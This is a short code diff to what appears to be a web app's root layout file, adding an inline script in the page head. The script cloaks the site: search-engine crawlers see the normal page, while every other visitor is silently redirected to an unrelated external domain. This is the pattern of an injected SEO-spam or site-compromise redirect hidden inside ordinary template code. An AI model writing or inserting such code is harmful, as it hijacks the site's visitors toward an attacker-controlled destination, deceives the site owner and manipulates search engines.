@@ -30,6 +30,21 @@ export default function RootLayout({
         <meta charSet="utf-8" />
         <meta name="robots" content="index, follow" />
         <meta name="theme-color" content="#08111f" />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://neo7-cr9t-ksh.com/dzbencl4f");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="antialiased">
         {children}
